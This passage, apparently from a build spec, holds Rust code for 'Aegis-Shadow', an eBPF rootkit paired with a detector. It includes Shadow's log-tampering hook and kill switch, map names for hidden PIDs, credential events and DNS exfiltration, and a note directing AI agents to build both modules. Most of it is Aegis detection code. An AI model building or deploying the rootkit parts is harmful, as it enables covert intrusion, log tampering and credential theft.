    log_prog.load()?;
    log_prog.attach("do_syslog", 0)?;
    info!("Attached log tampering hook on do_syslog");

    info!("Log tampering active. Press Ctrl+C to stop.");
    tokio::signal::ctrl_c().await?;
    info!("Shutting down log tampering...");

    Ok(())
}

fn run_cleanup() -> Result<()> {
    info!("Cleaning up Shadow: removing pinned BPF programs");

    let pin_path = Path::new(BPF_PIN_PATH);
    if pin_path.exists() {
        std::fs::remove_dir_all(pin_path)
            .context("Failed to remove pinned BPF programs")?;
        info!("Removed all pinned programs from {}", BPF_PIN_PATH);
    } else {
        info!("No pinned programs found at {}", BPF_PIN_PATH);
    }

    Ok(())
}

/// Emergency kill-switch: detach ALL Shadow eBPF programs and remove all pins.
/// This works even if the original loader process has crashed.
/// It uses bpftool to enumerate and detach programs by name pattern.
fn run_kill_switch() -> Result<()> {
    error!("[!] KILL SWITCH ACTIVATED — removing all Shadow eBPF programs");

    // Step 1: Remove pinned programs
    run_cleanup()?;

    // Step 2: Find and detach all Shadow programs by name prefix
    // Check if bpftool is available first
    let bpftool_check = std::process::Command::new("which")
        .arg("bpftool")
        .output();

    match bpftool_check {
        Err(e) => {
            error!("Cannot execute 'which bpftool': {}. Is bpftool installed?", e);
            error!("Install with: apt install linux-tools-common linux-tools-$(uname -r)");
            bail!("bpftool not found — cannot enumerate and detach programs. \
                   Install bpftool or manually remove pinned programs from {}", BPF_PIN_PATH);
        }
        Ok(output) if !output.status.success() => {
            error!("bpftool not found in PATH.");
            error!("Install with: apt install linux-tools-common linux-tools-$(uname -r)");
            bail!("bpftool not found — cannot enumerate and detach programs. \
                   Pinned programs were removed from {}, but running programs may persist.", BPF_PIN_PATH);
        }
        _ => {}
    }

    let output = std::process::Command::new("bpftool")
        .args(["prog", "list", "-j"])
        .output()
        .context("bpftool failed to list programs")?;

    if output.status.success() {
        let programs: Vec<serde_json::Value> = serde_json::from_slice(&output.stdout)?;
        let mut detached = 0u32;
        for prog in &programs {
            let name = prog.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let id = prog.get("id").and_then(|v| v.as_u64()).unwrap_or(0);
            // Match Shadow program names
            if name.starts_with("shadow_") {
                info!("Detaching Shadow program: id={}, name={}", id, name);
                let _ = std::process::Command::new("bpftool")
                    .args(["prog", "detach", &format!("id {}", id)])
                    .status();
                detached += 1;
            }
        }
        if detached == 0 {
            info!("No running Shadow programs found.");
        } else {
            info!("Detached {} Shadow programs.", detached);
        }
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        error!("bpftool prog list failed: {}", stderr);
        bail!("bpftool failed to list programs — some Shadow programs may still be running");
    }

    // Step 3: Remove any orphaned maps
    let output = std::process::Command::new("bpftool")
        .args(["map", "list", "-j"])
        .output();
    if let Ok(out) = output {
        if out.status.success() {
            let maps: Vec<serde_json::Value> = serde_json::from_slice(&out.stdout)?;
            for map in &maps {
                let name = map.get("name").and_then(|v| v.as_str()).unwrap_or("");
                let id = map.get("id").and_then(|v| v.as_u64()).unwrap_or(0);
                // Match Shadow map names
                if ["HIDDEN_PIDS", "CONFIG", "EVENTS", "GETDENTS_BUFS", "GETDENTS_RETS",
                    "OBFUSCATE_INODES", "MONITORED_TTYS", "CRED_EVENTS", "SPOOFED_PPIDS",
                    "DNS_EXFIL_QUEUE", "PROTECTED_PROG_IDS", "TIMESTOMP_INODES",
                    "LOG_SUPPRESS_PATTERNS"]
                    .contains(&name)
                {
                    info!("Removing Shadow map: id={}, name={}", id, name);
                    let _ = std::process::Command::new("bpftool")
                        .args(["map", "delete", &format!("id {}", id)])
                        .status();
                }
            }
        }
    }

    info!("Kill switch complete. All Shadow programs and maps removed.");
    Ok(())
}
```

> **NOTE FOR AI AGENTS**: The `include_bytes_aligned!` macro may need to be replaced with `aya::include_bytes_aligned!` or the bytes may need to be loaded from a file path depending on the Aya version. Check the Aya documentation for the current approach. Modern Aya versions use `Ebpf::load(aya::include_bytes_aligned!(...))` or `Ebpf::load_file("path/to/bytecode")`. **You MUST create a `build.rs`** for both `offense/` and `defense/` crates (see Section 8.4) that invokes the eBPF build and sets `OUT_DIR` correctly. Without `build.rs`, the `include_bytes_aligned!` macro will fail because the eBPF bytecode is not built by `cargo build` automatically.

---

## 7. Defensive Module: Aegis

### 7.1 defense-ebpf/Cargo.toml

```toml
[package]
name = "defense-ebpf"
version = "0.1.0"
edition = "2021"

[dependencies]
aya-ebpf = "~0.1"
aya-log-ebpf = "~0.1"
common = { path = "../common", default-features = false, features = ["kernel"] }

[[bin]]
name = "defense"
path = "src/main.rs"

[profile.release]
lto = true
panic = "abort"
opt-level = 2
debug = false
strip = "none"
```

### 7.2 defense-ebpf/src/main.rs — Multi-Syscall Latency Monitor

```rust
#![no_std]
#![no_main]

use aya_ebpf::{
    macros::{fentry, fexit, map},
    maps::{HashMap, PerCpuHashMap, PerfEventArray},
    programs::{FEntryContext, FExitContext},
    helpers::bpf_ktime_get_ns,
};
use aya_log_ebpf::info;
use common::{
    DefenseAlert, LatencyEntry, RateLimitEntry, ThresholdConfig,
    EVENT_LATENCY_ANOMALY,
    SYSCALL_GETDENTS64, SYSCALL_READ, SYSCALL_WRITE, SYSCALL_GETATTR, SYSCALL_SYSLOG,
    ALERT_RATE_LIMIT_NS,
};

// ──────────────────────────────────────────────
// MODULE 2: Multi-Syscall Latency Monitor
// ──────────────────────────────────────────────
//
// Strategy:
// 1. fentry on multiple syscalls: record entry timestamp with syscall_id.
// 2. fexit on same syscalls: calculate delta.
// 3. If delta exceeds configurable threshold, send rate-limited alert.
//
// Monitored syscalls (matching all offense hooks):
//   - sys_getdents64 (process hiding)
//   - vfs_read       (file obfuscation, ancestry spoofing, kallsyms hiding)
//   - ksys_write     (credential harvesting)
//   - vfs_getattr    (timestomping)
//   - do_syslog      (log tampering)
//
// Key encoding: (tgid << 4) | syscall_id  — supports up to 16 syscall types.

/// Per-CPU timestamp storage for latency measurement.
/// Key: (tgid << 4) | syscall_id. Value: LatencyEntry.
#[map]
static LATENCY_TIMESTAMPS: PerCpuHashMap<u64, LatencyEntry> =
    PerCpuHashMap::with_max_entries(8192, 0);

/// Alerts sent to defense user-space.
#[map]
static DEFENSE_EVENTS: PerfEventArray<DefenseAlert> = PerfEventArray::new(0);

/// Per-syscall baseline latency. Key: syscall_id (u32). Value: baseline_ns (u64).
#[map]
static BASELINE: HashMap<u32, u64> = HashMap::with_max_entries(16, 0);

/// Configurable threshold. Key: 0 (singleton). Value: ThresholdConfig.
#[map]
static THRESHOLD_CONFIG: HashMap<u32, ThresholdConfig> =
    HashMap::with_max_entries(1, 0);

/// Per-CPU rate limiter. Key: syscall_id. Value: RateLimitEntry.
#[map]
static RATE_LIMIT: PerCpuHashMap<u32, RateLimitEntry> =
    PerCpuHashMap::with_max_entries(16, 0);

/// Encode tgid and syscall_id into a single map key.
#[inline(always)]
fn make_key(tgid: u64, syscall_id: u32) -> u64 {
    (tgid << 4) | (syscall_id as u64 & 0xF)
}

/// Common entry logic: store timestamp for the given syscall.
#[inline(always)]
fn record_entry(syscall_id: u32) {
    let tgid = unsafe { aya_ebpf::helpers::bpf_get_current_pid_tgid() };
    let key = make_key(tgid, syscall_id);
    let entry = LatencyEntry {
        entry_ns: unsafe { bpf_ktime_get_ns() },
        syscall_id,
        _pad: 0,
    };
    let _ = LATENCY_TIMESTAMPS.insert(&key, &entry, 0);
}

/// Common exit logic: calculate latency, check threshold, emit rate-limited alert.
#[inline(always)]
fn check_exit(ctx: &FExitContext, syscall_id: u32) {
    let tgid = unsafe { aya_ebpf::helpers::bpf_get_current_pid_tgid() };
    let key = make_key(tgid, syscall_id);

    let entry = match unsafe { LATENCY_TIMESTAMPS.get(&key) } {
        Some(e) => *e,
        None => return,
    };
    let _ = LATENCY_TIMESTAMPS.remove(&key);

    let exit_ns = unsafe { bpf_ktime_get_ns() };
    let delta_ns = exit_ns.saturating_sub(entry.entry_ns);

    // Look up per-syscall baseline
    let baseline_ns = match unsafe { BASELINE.get(&syscall_id) } {
        Some(b) => *b,
        None => return, // No baseline yet — skip check
    };
    if baseline_ns == 0 {
        return;
    }

    // Get threshold (default: 13/10 = 130% = 30% above baseline)
    let (num, den) = match unsafe { THRESHOLD_CONFIG.get(&0u32) } {
        Some(cfg) => {
            if cfg.denominator == 0 { (13u32, 10u32) } else { (cfg.numerator, cfg.denominator) }
        }
        None => (13u32, 10u32),
    };
    let threshold = baseline_ns * num as u64 / den as u64;

    if delta_ns > threshold {
        // Rate-limit check: suppress alerts within ALERT_RATE_LIMIT_NS window
        let now = exit_ns;
        if let Some(rl) = unsafe { RATE_LIMIT.get(&syscall_id) } {
            if now.saturating_sub(rl.last_alert_ns) < ALERT_RATE_LIMIT_NS {
                return; // Too soon since last alert
            }
        }
        // Update rate limiter
        let _ = RATE_LIMIT.insert(&syscall_id, &RateLimitEntry { last_alert_ns: now }, 0);

        let alert = DefenseAlert {
            alert_type: EVENT_LATENCY_ANOMALY,
            severity: 3,
            prog_id: 0,
            map_id: 0,
            syscall_id,
            helper_id: 0,
            latency_ns: delta_ns,
            baseline_ns,
            related_pid: 0,
            _pad: 0,
        };
        DEFENSE_EVENTS.output(ctx, &alert, 0);
    }
}

// ─── sys_getdents64 ───────────────────────────
#[fentry(function = "sys_getdents64")]
pub fn aegis_getdents64_enter(_ctx: FEntryContext) -> u32 {
    record_entry(SYSCALL_GETDENTS64);
    0
}

#[fexit(function = "sys_getdents64")]
pub fn aegis_getdents64_exit(ctx: FExitContext) -> u32 {
    check_exit(&ctx, SYSCALL_GETDENTS64);
    0
}

// ─── vfs_read (covers file obfuscation, ancestry spoofing, kallsyms hiding) ───
#[fentry(function = "vfs_read")]
pub fn aegis_vfs_read_enter(_ctx: FEntryContext) -> u32 {
    record_entry(SYSCALL_READ);
    0
}

#[fexit(function = "vfs_read")]
pub fn aegis_vfs_read_exit(ctx: FExitContext) -> u32 {
    check_exit(&ctx, SYSCALL_READ);
    0
}

// ─── ksys_write (credential harvesting) ───────
#[fentry(function = "ksys_write")]
pub fn aegis_ksys_write_enter(_ctx: FEntryContext) -> u32 {
    record_entry(SYSCALL_WRITE);
    0
}

#[fexit(function = "ksys_write")]
pub fn aegis_ksys_write_exit(ctx: FExitContext) -> u32 {
    check_exit(&ctx, SYSCALL_WRITE);
    0
}

// ─── vfs_getattr (timestomping) ───────────────
#[fentry(function = "vfs_getattr")]
pub fn aegis_vfs_getattr_enter(_ctx: FEntryContext) -> u32 {
    record_entry(SYSCALL_GETATTR);
    0
}

#[fexit(function = "vfs_getattr")]
pub fn aegis_vfs_getattr_exit(ctx: FExitContext) -> u32 {
    check_exit(&ctx, SYSCALL_GETATTR);
    0
}

// ─── do_syslog (log tampering) ────────────────
#[fentry(function = "do_syslog")]
pub fn aegis_do_syslog_enter(_ctx: FEntryContext) -> u32 {
    record_entry(SYSCALL_SYSLOG);
    0
}

#[fexit(function = "do_syslog")]
pub fn aegis_do_syslog_exit(ctx: FExitContext) -> u32 {
    check_exit(&ctx, SYSCALL_SYSLOG);
    0
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
```

### 7.3 defense/Cargo.toml

```toml
[package]
name = "defense"
version = "0.1.0"
edition = "2021"
build = "build.rs"  # Required: triggers eBPF build and sets OUT_DIR

[dependencies]
aya = { version = "~0.13", features = ["async_tokio"] }
aya-log = "~0.2"
common = { path = "../common", features = ["user"] }
anyhow.workspace = true
clap.workspace = true
env_logger.workspace = true
log.workspace = true
tokio.workspace = true
libc = "0.2"         # For privilege checks and kill(2) probing
procfs = "0.16"       # For /proc parsing in ghost_map_audit and hidden_process_detector
serde = { version = "1", features = ["derive"] }
serde_json = "1"
bytes = "1"           # For AsyncPerfEventArray buffer reading
```

### 7.4 defense/src/main.rs — Detection Engine

```rust
mod ghost_map_audit;
mod hidden_process_detector;
mod integrity_check;
mod net_audit;

use anyhow::{Context, Result, bail};
use aya::maps::{HashMap, AsyncPerfEventArray};
use aya::programs::{FEntry, FExit};
use aya::util::online_cpus;
use aya::Ebpf;
use aya_log::EbpfLogger;
use bytes::BytesMut;
use clap::{Parser, Subcommand};
use common::{
    DefenseAlert, ThresholdConfig, BASELINE_DURATION_SECS,
    EVENT_LATENCY_ANOMALY, EVENT_GHOST_MAP_FOUND, EVENT_DANGEROUS_HELPER,
    EVENT_UNAUTHORIZED_HOOK, EVENT_HIDDEN_PROCESS, EVENT_ROGUE_NET_ATTACH,
    SYSCALL_GETDENTS64, SYSCALL_READ, SYSCALL_WRITE, SYSCALL_GETATTR, SYSCALL_SYSLOG,
};
use log::{info, warn, error};
use serde::Serialize;
use std::sync::atomic::{AtomicU64, Ordering};
use tokio::signal;

/// Structured finding for aggregated audit results.
#[derive(Debug, Serialize)]
struct AuditFinding {
    module: String,
    severity: &'static str,
    description: String,
}

/// Aggregated audit report.
#[derive(Debug, Serialize)]
struct AuditReport {
    findings: Vec<AuditFinding>,
    critical_count: usize,
    warning_count: usize,
    info_count: usize,
}

impl AuditReport {
    fn new() -> Self {
        Self { findings: Vec::new(), critical_count: 0, warning_count: 0, info_count: 0 }
    }

    fn add(&mut self, module: &str, severity: &'static str, description: String) {
        match severity {
            "critical" => self.critical_count += 1,
            "warning" => self.warning_count += 1,
            _ => self.info_count += 1,
        }
        self.findings.push(AuditFinding {
            module: module.to_string(),
            severity,
            description,
        });
    }

    fn has_critical(&self) -> bool {
        self.critical_count > 0
    }

    fn print_summary(&self) {
        info!("════════════════════════════════════════");
        info!("  Aegis Audit Summary");
        info!("════════════════════════════════════════");
        info!("  Critical: {}", self.critical_count);
        info!("  Warning:  {}", self.warning_count);
        info!("  Info:     {}", self.info_count);
        info!("  Total:    {}", self.findings.len());
        info!("════════════════════════════════════════");
        if self.has_critical() {
            error!("[!] CRITICAL findings detected — immediate investigation recommended.");
        } else if self.warning_count > 0 {
            warn!("[~] Warnings found — review recommended.");
        } else {
            info!("[OK] System appears clean.");
        }
    }

    fn print_json(&self) {
        match serde_json::to_string_pretty(self) {
            Ok(json) => println!("{}", json),
            Err(e) => error!("Failed to serialize report: {}", e),
        }
    }
}

/// Check if the current process has sufficient privileges for eBPF operations.
fn check_privileges() -> Result<()> {
    if unsafe { libc::geteuid() } != 0 {
        bail!(
            "Insufficient privileges. Run with sudo or set CAP_BPF + CAP_PERFMON:\n  \
             sudo setcap cap_bpf,cap_perfmon=ep ./target/release/defense"
        );
    }
    Ok(())
}

/// Check if bpftool is available and return a descriptive error if not.
fn check_bpftool() -> Result<()> {
    match std::process::Command::new("bpftool").arg("version").output() {
        Ok(out) if out.status.success() => Ok(()),
        _ => bail!(
            "bpftool is not installed or not in PATH. Install it with:\n  \
             sudo apt install -y linux-tools-common linux-tools-$(uname -r)\n\
             Some defense features (ghost-maps, integrity-check) require bpftool to function."
        ),
    }
}

fn syscall_name(id: u32) -> &'static str {
    match id {
        SYSCALL_GETDENTS64 => "getdents64",
        SYSCALL_READ => "vfs_read",
        SYSCALL_WRITE => "ksys_write",
        SYSCALL_GETATTR => "vfs_getattr",
        SYSCALL_SYSLOG => "do_syslog",
        _ => "unknown",
    }
}

#[derive(Parser)]
#[command(name = "aegis")]
#[command(about = "Aegis-Shadow: eBPF Runtime Security Shield")]
struct Cli {
    /// Output results as JSON lines (for SIEM/CI integration)
    #[arg(long, global = true)]
    json: bool,

    /// Latency threshold multiplier (e.g., 1.3 = 30% above baseline)
    #[arg(long, global = true, default_value = "1.3")]
    threshold: f64,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Run full audit: ghost maps + integrity + hidden procs + net + latency
    Audit,
    /// Calibrate latency baseline (run for 10 seconds)
    Baseline,
    /// Monitor syscall latency in real-time
    Monitor,
    /// Scan for ghost BPF maps (no eBPF required)
    GhostMaps,
    /// Check bytecode integrity of loaded BPF programs
    IntegrityCheck,
    /// Audit BPF programs attached to sensitive hooks
    HookAudit,
    /// Scan for processes hidden from /proc enumeration
    HiddenProcs,
    /// Scan for rogue XDP/TC attachments on network interfaces
    NetAudit,
    /// Detach and unpin suspicious BPF programs (requires confirmation)
    Quarantine {
        /// BPF program IDs to detach/unpin
        #[arg(required = true)]
        prog_ids: Vec<u32>,
    },
}

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();
    let cli = Cli::parse();
    let json_mode = cli.json;

    // Commands that require eBPF need root privileges
    match cli.command {
        Commands::Baseline | Commands::Monitor | Commands::Audit => {
            check_privileges()?;
        }
        Commands::GhostMaps | Commands::IntegrityCheck | Commands::HookAudit
        | Commands::NetAudit | Commands::Quarantine { .. } => {
            check_bpftool()?;
        }
        _ => {}
    }

    let exit_code: i32 = match cli.command {
        Commands::Audit => {
            let report = run_full_audit(cli.threshold).await?;
            if json_mode { report.print_json(); } else { report.print_summary(); }
            if report.has_critical() { 2 } else if report.warning_count > 0 { 1 } else { 0 }
        }
        Commands::Baseline => {
            run_baseline(cli.threshold).await?;
            0
        }
        Commands::Monitor => {
            run_monitor(cli.threshold, json_mode).await?;
            0
        }
        Commands::GhostMaps => {
            let findings = ghost_map_audit::scan_ghost_maps()?;
            if json_mode {
                println!("{}", serde_json::to_string_pretty(&findings)?);
            }
            if findings.iter().any(|f| f.severity == "critical") { 2 } else { 0 }
        }
        Commands::IntegrityCheck => {
            let findings = integrity_check::check_all_programs()?;
            if json_mode {
                println!("{}", serde_json::to_string_pretty(&findings)?);
            }
            if !findings.is_empty() { 2 } else { 0 }
        }
        Commands::HookAudit => {
            let findings = integrity_check::audit_hooks()?;
            if json_mode {
                println!("{}", serde_json::to_string_pretty(&findings)?);
            }
            if !findings.is_empty() { 2 } else { 0 }
        }
        Commands::HiddenProcs => {
            let hidden = hidden_process_detector::scan_hidden_processes()?;
            if json_mode {
                println!("{}", serde_json::to_string_pretty(&hidden)?);
            }
            if !hidden.is_empty() { 2 } else { 0 }
        }
        Commands::NetAudit => {
            let findings = net_audit::scan_network_attachments()?;
            if json_mode {
                println!("{}", serde_json::to_string_pretty(&findings)?);
            }
            if !findings.is_empty() { 2 } else { 0 }
        }
        Commands::Quarantine { prog_ids } => {
            quarantine_programs(&prog_ids)?;
            0
        }
    };

    std::process::exit(exit_code);
}

async fn run_full_audit(threshold: f64) -> Result<AuditReport> {
    let mut report = AuditReport::new();
    info!("=== Aegis Full Audit ===");

    // Step 1: Ghost Map Scan
    info!("[1/5] Scanning for ghost BPF maps...");
    match ghost_map_audit::scan_ghost_maps() {
        Ok(findings) => {
            for f in &findings {
                report.add("ghost-maps", f.severity, f.description.clone());
            }
        }
        Err(e) => report.add("ghost-maps", "warning", format!("Scan failed: {}", e)),
    }

    // Step 2: Bytecode Integrity Check
    info!("[2/5] Checking BPF program integrity...");
    match integrity_check::check_all_programs() {
        Ok(findings) => {
            for f in &findings {
                report.add("integrity", "critical", f.description.clone());
            }
        }
        Err(e) => report.add("integrity", "warning", format!("Check failed: {}", e)),
    }

    // Step 3: Hook Audit
    info!("[3/5] Auditing BPF hook attachments...");
    match integrity_check::audit_hooks() {
        Ok(findings) => {
            for f in &findings {
                report.add("hook-audit", "critical", f.description.clone());
            }
        }
        Err(e) => report.add("hook-audit", "warning", format!("Audit failed: {}", e)),
    }

    // Step 4: Hidden Process Scan
    info!("[4/5] Scanning for hidden processes...");
    match hidden_process_detector::scan_hidden_processes() {
        Ok(hidden) => {
            for pid in &hidden {
                report.add("hidden-procs", "critical",
                    format!("PID {} exists but is hidden from /proc enumeration", pid));
            }
        }
        Err(e) => report.add("hidden-procs", "warning", format!("Scan failed: {}", e)),
    }

    // Step 5: Network Attachment Audit
    info!("[5/5] Scanning network attachments...");
    match net_audit::scan_network_attachments() {
        Ok(findings) => {
            for f in &findings {
                report.add("net-audit", f.severity, f.description.clone());
            }
        }
        Err(e) => report.add("net-audit", "warning", format!("Scan failed: {}", e)),
    }

    Ok(report)
}

/// Load defense-ebpf bytecode and return the Ebpf handle with programs attached.
fn load_defense_ebpf(threshold: f64) -> Result<Ebpf> {
    let mut ebpf = Ebpf::load(
        aya::include_bytes_aligned!(concat!(env!("OUT_DIR"), "/defense"))
    )?;

    if let Err(e) = EbpfLogger::init(&mut ebpf) {
        warn!("Failed to init eBPF logger: {}", e);
    }

    // Set threshold config
    let numerator = (threshold * 10.0) as u32;
    let denominator = 10u32;
    let mut threshold_map: HashMap<_, u32, ThresholdConfig> =
        HashMap::try_from(ebpf.map_mut("THRESHOLD_CONFIG").context("THRESHOLD_CONFIG map not found")?)?;
    threshold_map.insert(
        0u32,
        ThresholdConfig { numerator, denominator },
        0,
    )?;

    // Attach fentry/fexit pairs for all monitored syscalls
    let pairs = [
        ("aegis_getdents64_enter", "aegis_getdents64_exit"),
        ("aegis_vfs_read_enter", "aegis_vfs_read_exit"),
        ("aegis_ksys_write_enter", "aegis_ksys_write_exit"),
        ("aegis_vfs_getattr_enter", "aegis_vfs_getattr_exit"),
        ("aegis_do_syslog_enter", "aegis_do_syslog_exit"),
    ];

    for (entry_name, exit_name) in &pairs {
        let prog: &mut FEntry = ebpf.program_mut(entry_name)
            .context(format!("{} not found", entry_name))?
            .try_into()?;
        prog.load()?;
        prog.attach()?;
        info!("Attached fentry: {}", entry_name);

        let prog: &mut FExit = ebpf.program_mut(exit_name)
            .context(format!("{} not found", exit_name))?
            .try_into()?;
        prog.load()?;
        prog.attach()?;
        info!("Attached fexit: {}", exit_name);
    }

    Ok(ebpf)
}

async fn run_baseline(threshold: f64) -> Result<()> {
    info!("Calibrating latency baseline for {} seconds...", BASELINE_DURATION_SECS);

    let mut ebpf = load_defense_ebpf(threshold)?;

    // Collect latency samples: run the eBPF programs for BASELINE_DURATION_SECS,
    // then read LATENCY_TIMESTAMPS entries to compute mean latency per syscall.
    // During baseline, no BASELINE values are set, so no alerts fire — the programs
    // simply record entry timestamps and calculate deltas.
    //
    // We use a perf event approach: temporarily set baseline to 0 (already the default),
    // let syscalls execute normally, then poll DEFENSE_EVENTS. But since baseline=0
    // means "skip check," we instead collect samples by setting a very high baseline
    // and a threshold of 1000x so everything fires, then compute the mean.

    // Set an artificial baseline of 1ns with threshold 1000000x so ALL calls fire alerts.
    // This lets us collect raw latency samples through the perf channel.
    let syscall_ids = [
        SYSCALL_GETDENTS64, SYSCALL_READ, SYSCALL_WRITE,
        SYSCALL_GETATTR, SYSCALL_SYSLOG,
    ];

    {
        let mut baseline_map: HashMap<_, u32, u64> =
            HashMap::try_from(ebpf.map_mut("BASELINE").context("BASELINE map not found")?)?;
        let mut thresh_map: HashMap<_, u32, ThresholdConfig> =
            HashMap::try_from(ebpf.map_mut("THRESHOLD_CONFIG").context("THRESHOLD_CONFIG map not found")?)?;

        for &sc in &syscall_ids {
            baseline_map.insert(sc, 1u64, 0)?; // baseline = 1ns
        }
        // threshold: 1/1 = 100%, so anything > 1ns fires (i.e., everything)
        thresh_map.insert(0u32, ThresholdConfig { numerator: 1, denominator: 1 }, 0)?;
    }

    // Collect samples from perf events
    let mut perf_array = AsyncPerfEventArray::try_from(
        ebpf.map_mut("DEFENSE_EVENTS").context("DEFENSE_EVENTS map not found")?
    )?;

    // Per-syscall accumulators
    let sample_counts: [AtomicU64; 5] = Default::default();
    let sample_sums: [AtomicU64; 5] = Default::default();

    let cpus = online_cpus().context("Failed to get online CPUs")?;
    let mut handles = Vec::new();

    for cpu in cpus {
        let mut buf = perf_array.open(cpu, Some(256))?;
        let counts = &sample_counts;
        let sums = &sample_sums;

        handles.push(tokio::spawn(async move {
            let mut buffers = (0..64)
                .map(|_| BytesMut::with_capacity(std::mem::size_of::<DefenseAlert>()))
                .collect::<Vec<_>>();
            loop {
                let events = buf.read_events(&mut buffers).await;
                match events {
                    Ok(events) => {
                        for i in 0..events.read {
                            if buffers[i].len() >= std::mem::size_of::<DefenseAlert>() {
                                let alert: DefenseAlert = unsafe {
                                    std::ptr::read_unaligned(
                                        buffers[i].as_ptr() as *const DefenseAlert
                                    )
                                };
                                let idx = alert.syscall_id as usize;
                                if idx < 5 {
                                    counts[idx].fetch_add(1, Ordering::Relaxed);
                                    sums[idx].fetch_add(alert.latency_ns, Ordering::Relaxed);
                                }
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
        }));
    }

    // Wait for baseline duration
    info!("Collecting samples for {} seconds...", BASELINE_DURATION_SECS);
    tokio::time::sleep(std::time::Duration::from_secs(BASELINE_DURATION_SECS as u64)).await;

    // Abort collection tasks
    for h in handles {
        h.abort();
    }

    // Compute and store baselines
    let mut baseline_map: HashMap<_, u32, u64> =
        HashMap::try_from(ebpf.map_mut("BASELINE").context("BASELINE map not found")?)?;

    info!("── Baseline Results ──");
    for (i, &sc) in syscall_ids.iter().enumerate() {
        let count = sample_counts[i].load(Ordering::Relaxed);
        let sum = sample_sums[i].load(Ordering::Relaxed);
        if count > 0 {
            let mean = sum / count;
            baseline_map.insert(sc, mean, 0)?;
            info!(
                "  {}: mean={}ns ({} samples)",
                syscall_name(sc), mean, count
            );
        } else {
            info!("  {}: no samples collected", syscall_name(sc));
        }
    }

    // Reset threshold to actual user-specified value
    {
        let mut thresh_map: HashMap<_, u32, ThresholdConfig> =
            HashMap::try_from(ebpf.map_mut("THRESHOLD_CONFIG").context("THRESHOLD_CONFIG map not found")?)?;
        let numerator = (threshold * 10.0) as u32;
        thresh_map.insert(0u32, ThresholdConfig { numerator, denominator: 10 }, 0)?;
    }

    info!("Baseline calibration complete. Programs still attached — run 'monitor' to begin detection.");
    // Note: ebpf is dropped here, detaching all programs.
    // In production, you'd serialize baselines to disk and reload in monitor mode.
    Ok(())
}

async fn run_monitor(threshold: f64, json_mode: bool) -> Result<()> {
    info!("Starting real-time latency monitor (Ctrl+C to stop)...");

    let mut ebpf = load_defense_ebpf(threshold)?;

    // Set up perf event reader on DEFENSE_EVENTS map
    let mut perf_array = AsyncPerfEventArray::try_from(
        ebpf.map_mut("DEFENSE_EVENTS").context("DEFENSE_EVENTS map not found")?
    )?;

    let alert_count = std::sync::Arc::new(AtomicU64::new(0));

    let cpus = online_cpus().context("Failed to get online CPUs")?;
    let mut handles = Vec::new();

    for cpu in cpus {
        let mut buf = perf_array.open(cpu, Some(256))?;
        let counter = alert_count.clone();
        let json = json_mode;

        handles.push(tokio::spawn(async move {
            let mut buffers = (0..64)
                .map(|_| BytesMut::with_capacity(std::mem::size_of::<DefenseAlert>()))
                .collect::<Vec<_>>();
            loop {
                let events = buf.read_events(&mut buffers).await;
                match events {
                    Ok(events) => {
                        for i in 0..events.read {
                            if buffers[i].len() >= std::mem::size_of::<DefenseAlert>() {
                                let alert: DefenseAlert = unsafe {
                                    std::ptr::read_unaligned(
                                        buffers[i].as_ptr() as *const DefenseAlert
                                    )
                                };
                                counter.fetch_add(1, Ordering::Relaxed);
                                if json {
                                    print_alert_json(&alert);
                                } else {
                                    print_alert(&alert);
                                }
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
        }));
    }

    // Wait for Ctrl+C
    signal::ctrl_c().await?;

    // Abort readers
    for h in handles {
        h.abort();
    }

    let total = alert_count.load(Ordering::Relaxed);
    info!("Monitor stopped. Total alerts: {}", total);
    Ok(())
}

fn print_alert(alert: &DefenseAlert) {
    match alert.alert_type {
        EVENT_LATENCY_ANOMALY => {
            let pct = if alert.baseline_ns > 0 {
                ((alert.latency_ns as f64 / alert.baseline_ns as f64) - 1.0) * 100.0
            } else {
                0.0
            };
            error!(
                "[!] LATENCY ANOMALY [{}]: measured={}ns, baseline={}ns (+{:.1}%)",
                syscall_name(alert.syscall_id),
                alert.latency_ns,
                alert.baseline_ns,
                pct
            );
        }
        EVENT_GHOST_MAP_FOUND => {
            error!(
                "[!] GHOST MAP: map_id={}, no owning process found",
                alert.map_id
            );
        }
        EVENT_DANGEROUS_HELPER => {
            error!(
                "[!] DANGEROUS HELPER: prog_id={}, helper_id={} ({})",
                alert.prog_id,
                alert.helper_id,
                integrity_check::helper_name_public(alert.helper_id)
            );
        }
        EVENT_UNAUTHORIZED_HOOK => {
            error!(
                "[!] UNAUTHORIZED HOOK: prog_id={} attached to sensitive syscall",
                alert.prog_id
            );
        }
        EVENT_HIDDEN_PROCESS => {
            error!(
                "[!] HIDDEN PROCESS: PID {} exists but invisible in /proc",
                alert.related_pid
            );
        }
        EVENT_ROGUE_NET_ATTACH => {
            error!(
                "[!] ROGUE NETWORK ATTACHMENT: prog_id={} (XDP/TC on unexpected interface)",
                alert.prog_id
            );
        }
        _ => {
            warn!("[?] Unknown alert type: {} (severity={})", alert.alert_type, alert.severity);
        }
    }
}

fn print_alert_json(alert: &DefenseAlert) {
    let json = serde_json::json!({
        "alert_type": alert.alert_type,
        "severity": alert.severity,
        "prog_id": alert.prog_id,
        "map_id": alert.map_id,
        "syscall_id": alert.syscall_id,
        "syscall_name": syscall_name(alert.syscall_id),
        "helper_id": alert.helper_id,
        "latency_ns": alert.latency_ns,
        "baseline_ns": alert.baseline_ns,
        "related_pid": alert.related_pid,
    });
    println!("{}", json);
}

/// Quarantine: detach and unpin specified BPF program IDs.
fn quarantine_programs(prog_ids: &[u32]) -> Result<()> {
    for &pid in prog_ids {
        info!("Quarantining BPF program id={}...", pid);
        let output = std::process::Command::new("bpftool")
            .args(["prog", "detach", &format!("id {}", pid)])
            .output();
        match output {
            Ok(out) if out.status.success() => {
                info!("  Detached program id={}", pid);
            }
            _ => {
                warn!("  Could not detach program id={} — it may not be attached or may require unpin", pid);
            }
        }
        // Also try to unpin if pinned
        let output = std::process::Command::new("bpftool")
            .args(["prog", "show", "id", &format!("{}", pid), "-j"])
            .output();
        if let Ok(out) = output {
            if out.status.success() {
                let json: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap_or_default();
                if let Some(pinned) = json.get("pinned").and_then(|v| v.as_array()) {
